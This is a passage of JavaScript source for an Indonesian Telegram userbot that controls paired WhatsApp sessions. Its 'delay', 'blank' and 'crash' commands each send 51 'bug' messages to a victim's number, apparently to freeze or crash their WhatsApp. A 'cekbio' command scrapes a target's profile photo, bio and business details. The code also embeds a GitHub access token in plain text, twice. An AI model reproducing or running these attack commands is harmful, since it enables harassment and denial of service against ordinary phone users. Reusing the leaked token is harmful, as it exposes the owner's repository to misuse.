          message: `<blockquote>❌ <b>ɴᴏ ᴜʀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b>\n\n📋 <b>ᴅᴀғᴛᴀʀ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ:</b>\n${apiList}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const apiIdToDelete = apiIds[index];
      
      const deletingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇɴɢʜᴀᴘᴜs API_ID ${apiIdToDelete}...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const result = await removeApiIdFromGithub(apiIdToDelete);

      await client.deleteMessages(chatId, [deletingMsg.id], { revoke: true });
      
      if (result.updated) {
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>API_ID ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!</b>\n\n✏️ <b>API_ID:</b> <code>${apiIdToDelete}</code>\n📋 <b>ᴛᴏᴛᴀʟ API_ID ᴛᴇʀᴅᴀғᴛᴀʀ:</b> ${result.totalIds}\n\n🕒 <b>ᴡᴀᴋᴛᴜ:</b> ${new Date().toLocaleString('id-ID')}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs API_ID!</b>\n\n✏️ <b>API_ID:</b> <code>${apiIdToDelete}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (error) {
      console.error("Error in delapi command:", error);
      const chatId = message.chatId || message.chat.id;
      
      try {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      } catch (e) {}
      try {
        await client.deleteMessages(chatId, [deletingMsg.id], { revoke: true });
      } catch (e) {}
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs API_ID!</b>\n\n⚠️ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

async function getAllApiIds() {
  const owner = 'ObyMoods';
  const repo = 'ObyDatabase';
  const filePath = 'api_ids.json';
  const token = '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';
  
  try {
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
    const res = await axios.get(url, {
      headers: {
        Authorization: `token ${token}`,
        Accept: "application/vnd.github.v3+json",
        'User-Agent': 'UBOT-YAKUZA-BOT'
      },
      timeout: 10000
    });
    
    const content = Buffer.from(res.data.content, 'base64').toString('utf8');
    const jsonData = JSON.parse(content);
    
    if (jsonData && jsonData.allowed_api_ids && Array.isArray(jsonData.allowed_api_ids)) {
      return jsonData.allowed_api_ids.map(id => String(id).trim());
    }
    return [];
    
  } catch (error) {
    if (error.response?.status === 404) {
      console.log("⚠️ File api_ids.json tidak ditemukan");
    } else {
      console.error("❌ Gagal mengambil daftar API ID:", error.message);
    }
    return [];
  }
}

async function removeApiIdFromGithub(apiId) {
  const owner = 'ObyMoods';
  const repo = 'ObyDatabase';
  const filePath = 'api_ids.json';
  const token = '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';
  
  try {
    
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
    const fileData = await axios.get(url, {
      headers: {
        Authorization: `token ${token}`,
        Accept: "application/vnd.github.v3+json",
        'User-Agent': 'UBOT-YAKUZA-BOT'
      },
      timeout: 10000
    });
    
    const content = Buffer.from(fileData.data.content, 'base64').toString('utf8');
    const currentData = JSON.parse(content);
    
    if (!currentData.allowed_api_ids || !Array.isArray(currentData.allowed_api_ids)) {
      throw new Error("Format file tidak valid");
    }

    if (!currentData.allowed_api_ids.includes(String(apiId))) {
      console.log("⚠️ API ID tidak ditemukan dalam daftar");
      return { 
        updated: false, 
        message: "not_found",
        totalIds: currentData.allowed_api_ids.length
      };
    }

    currentData.allowed_api_ids = currentData.allowed_api_ids.filter(id => id !== String(apiId));
    
    const payload = {
      message: `➖ Remove API ID ${apiId} - UBOT YAKUZA`,
      content: Buffer.from(JSON.stringify(currentData, null, 2), "utf8").toString("base64"),
      branch: "main",
      sha: fileData.data.sha
    };

    const headers = {
      Authorization: `token ${token}`,
      Accept: "application/vnd.github.v3+json",
      'User-Agent': 'UBOT-YAKUZA-BOT'
    };
    
    const res = await axios.put(url, payload, { headers, timeout: 15000 });
        
    return { 
      updated: true, 
      result: res.data,
      totalIds: currentData.allowed_api_ids.length
    };
    
  } catch (error) {
    console.error("❌ Error menghapus API ID:", error.response?.data || error.message);
    throw error;
  }
}

case 'sound': 
  await soundHandler(message, client, args, prefix);
  break;
  
case 'cekff': 
  await cekffHandler(message, client, args, prefix);
  break;
  
case 'getlink': 
  await handlerGetLink(message, client, prefix);
  break;
    
case "reqpair": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}reqpair 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botNumber = args[0].replace(/[^0-9]/g, "");

      if (!botNumber || botNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴡʜᴀᴛsᴀᴘᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      await connectToWhatsApp(client, botNumber, chatId);

    } catch (error) {
      console.error("Error in reqpair command:", error);
      const chatId = message.chatId || message.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "listpair": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;

      if (!fs.existsSync(SESSIONS_FILE)) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      
      if (activeNumbers.length === 0) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const sessionList = activeNumbers.map((number, index) => 
        `${index + 1}. <code>${number}</code>`
      ).join('\n');

      await client.sendMessage(chatId, {
        message: `<blockquote>📝 <b>ʟɪsᴛ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b>\n\n${sessionList}\n\n📋 <b>ᴛᴏᴛᴀʟ:</b> ${activeNumbers.length}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      console.error("Error in listsession command:", error);
      const chatId = message.chatId || message.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ sᴇssɪᴏɴ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "delpair": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delpair 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const botNumber = args[0].replace(/[^0-9]/g, "");

      if (!fs.existsSync(SESSIONS_FILE)) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      
      if (!activeNumbers.includes(botNumber)) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>sᴇssɪᴏɴ ᴜɴᴛᴜᴋ ɴᴏ ${botNumber} ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const updatedNumbers = activeNumbers.filter(num => num !== botNumber);
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));

      const sessionDir = createSessionDir(botNumber);
      try {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      } catch (error) {
        console.error("Error deleting session directory:", error);
      }

      if (sessions.has(botNumber)) {
        sessions.delete(botNumber);
      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <b>sᴇssɪᴏɴ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!</b>\n\n📝 <b>ɴᴏ:</b> <code>${botNumber}</code>\n📋 <b>sɪsᴀ sᴇssɪᴏɴ:</b> ${updatedNumbers.length}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      console.error("Error in delsession command:", error);
      const chatId = message.chatId || message.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs sᴇssɪᴏɴ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "delay": {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delay 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (sessions.size === 0) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴅᴇʟᴀʏ ᴠɪsɪʙʟᴇ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 0; i <= 50; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          await YakuzaSpong(sock, target, mention);
          
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴅᴇʟᴀʏ ᴠɪsɪʙʟᴇ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ ʙᴇʀʜᴀsɪʟ: ${successCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      console.error("Error delay visible command:", error);
      const chatId = message.chatId || message.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴅᴇʟᴀʏ ᴠɪsɪʙʟᴇ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "blank": {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}blank 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (sessions.size === 0) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ʙʟᴀɴᴋ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 0; i <= 50; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          await chatFrezze(sock, target);
          
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ʙʟᴀɴᴋ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ ʙᴇʀʜᴀsɪʟ: ${successCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      console.error("Error blank command:", error);
      const chatId = message.chatId || message.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ʙʟᴀɴᴋ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "crash": {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}crash 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (sessions.size === 0) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 0; i <= 50; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          await OtaxNewUi(sock, target, Ptcp = true);
          
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ ʙᴇʀʜᴀsɪʟ: ${successCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

    } catch (error) {
      console.error("Error crash command:", error);
      const chatId = message.chatId || message.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "cekbio": {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}cekbio 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const targetJid = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴡʜᴀᴛsᴀᴘᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      if (sessions.size === 0) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
🚀 sᴇᴅᴀɴɢ ᴍᴇɴɢᴀᴍʙɪʟ ɪɴғᴏʀᴍᴀsɪ <code>${formattedNumber}</code>
</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock || !sock.user) {
        throw new Error("Koneksi WhatsApp tidak valid");
      }

      let profilePictureBuffer = null;
      let profileStatus = null;
      let profileName = null;
      let isBusiness = false;
      let businessInfo = null;
      let isRegistered = true;
      let hasProfilePicture = false;

      try {
        try {
          const [result] = await sock.onWhatsApp(targetJid);
          if (!result || !result.exists) {
            isRegistered = false;
            throw new Error("Nomor tidak terdaftar di WhatsApp");
          }

        } catch (waError) {
          isRegistered = false;
          throw new Error("Nomor tidak terdaftar di WhatsApp");
        }

        try {
          const ppUrl = await sock.profilePictureUrl(targetJid, 'image');
          console.log(`[CEKBIO] Foto profil ditemukan, downloading: ${ppUrl}`);
          
          const response = await axios({
            method: 'GET',
            url: ppUrl,
            responseType: 'arraybuffer',
            timeout: 30000,
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });
          
          profilePictureBuffer = Buffer.from(response.data);
          hasProfilePicture = true;
          console.log(`[CEKBIO] Foto profil berhasil diunduh`);
          
        } catch (ppError) {
          hasProfilePicture = false;
                      
            try {
              const response = await axios({
                method: 'GET',
                url: 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
                responseType: 'arraybuffer',
                timeout: 30000
              });
              profilePictureBuffer = Buffer.from(response.data);
              console.log(`[CEKBIO] Menggunakan gambar WhatsApp default`);
            } catch (fallbackError) {
              profilePictureBuffer = null;
            }
          }

        try {
          const status = await sock.fetchStatus(targetJid);
          profileStatus = status?.status || "ᴛɪᴅᴀᴋ ᴀᴅᴀ";
        } catch (statusError) {
          profileStatus = "ᴛɪᴅᴀᴋ ᴀᴅᴀ / ᴀᴋᴜɴ ᴘʀɪᴠᴀᴛᴇ";
        }

        try {
          const contact = await sock.getContact(targetJid);
          profileName = contact?.name || contact?.pushname || contact?.verifiedName || "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
        } catch (contactError) {
          profileName = "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
        }

        try {
          const businessProfile = await sock.getBusinessProfile(targetJid);
          if (businessProfile) {
            isBusiness = true;
            businessInfo = {
              description: businessProfile.description || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴅᴇsᴋʀɪᴘsɪ",
              address: businessProfile.address || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀʟᴀᴍᴀᴛ",
              email: businessProfile.email || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴇᴍᴀɪʟ",
              website: businessProfile.website?.[0] || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴡᴇʙsɪᴛᴇ",
              category: businessProfile.category || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴇɢᴏʀɪ"
            };
          }
        } catch (businessError) {
          isBusiness = false;
        }

      } catch (error) {
        throw error;
      }

      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });

      let captionMessage = `<blockquote>
 <b>ɪɴғᴏʀᴍᴀsɪ ᴅᴇᴛᴀɪʟ ᴅᴀʀɪ ᴡʜᴀᴛsᴀᴘᴘ</b>

➤ <b>ɴᴏ:</b> <code>${formattedNumber}</code>
➤ <b>ɴᴀᴍᴀ:</b> ${profileName}
${isBusiness ? '➤ <b>ᴛʏᴘᴇ:</b> ᴀᴋᴜɴ ʙɪsɴɪs' : '➤ <b>ᴛʏᴘᴇ:</b> ᴀᴋᴜɴ ʙɪᴀsᴀ'}
${hasProfilePicture ? '➤ <b>ғᴏᴛᴏ ᴘʀᴏғɪʟ:</b> ✅ ᴀᴅᴀ' : '➤ <b>ғᴏᴛᴏ ᴘʀᴏғɪʟ:</b> ❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ'}

➤ <b>ʙɪᴏ:</b>
${profileStatus}
`;

      if (isBusiness && businessInfo) {
        captionMessage += `
➤ <b>ɪɴғᴏ ᴀᴋᴜɴ ʙɪsɴɪs:</b>
➤ <b>ᴅᴇsᴋʀɪᴘsɪ:</b> ${businessInfo.description}
➤ <b>ᴀʟᴀᴍᴀᴛ:</b> ${businessInfo.address}
➤ <b>ɢᴍᴀɪʟ:</b> ${businessInfo.email}
➤ <b>ᴡᴇʙsɪᴛᴇ:</b> ${businessInfo.website}
➤ <b>ᴋᴀᴛᴇɢᴏʀɪ:</b> ${businessInfo.category}
`;
      }

      captionMessage += `
➤ <b>ʟɪɴᴋ ᴡʜᴀᴛsᴀᴘᴘ:</b> https://wa.me/${formattedNumber}
</blockquote>`;

      if (profilePictureBuffer && profilePictureBuffer.length > 0) {
        try {
          const filePath = path.join(__dirname, `cekbio_${formattedNumber}_${Date.now()}.jpg`);
          fs.writeFileSync(filePath, profilePictureBuffer);

          await client.sendFile(chatId, {
            file: filePath,
            fileName: `profile_${formattedNumber}.jpg`,
            caption: captionMessage,
            parseMode: "html"
          });
          
          try {
            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
          } catch (cleanupError) {

          }
          
        } catch (fileError) {
          try {
            const filePath = path.join(__dirname, `cekbio_${formattedNumber}_${Date.now()}.jpg`);
            fs.writeFileSync(filePath, profilePictureBuffer);
            
            await client.sendDocument(chatId, {
              document: filePath,
              fileName: `profile_${formattedNumber}.jpg`,
              caption: captionMessage,
              parseMode: "html"
            });
            
            try {
              if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            } catch (cleanupError) {

            }
            
          } catch (docError) {
            await client.sendMessage(chatId, {
              message: captionMessage,
              parseMode: "html",
              replyTo: message.id
            });
          }
        }
      } else {
        await client.sendMessage(chatId, {
          message: captionMessage,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (error) {
      const chatId = message.chatId || message.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      let errorMessage = "";
      const formattedNumber = args ? args[0].replace(/[^0-9]/g, "") : "Unknown";
      
      if (error.message.includes("tidak terdaftar")) {
        errorMessage = `<blockquote>
 <b>ɪɴғᴏʀᴍᴀsɪ ᴅᴇᴛᴀɪʟ ᴅᴀʀɪ ᴡʜᴀᴛsᴀᴘᴘ</b>

➤ <b>ɴᴏ:</b> <code>${formattedNumber}</code>
➤ <b>sᴛᴀᴛᴜs:</b> ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ
</blockquote>`;
      } else if (error.message.includes("Private")) {
        errorMessage = `<blockquote>
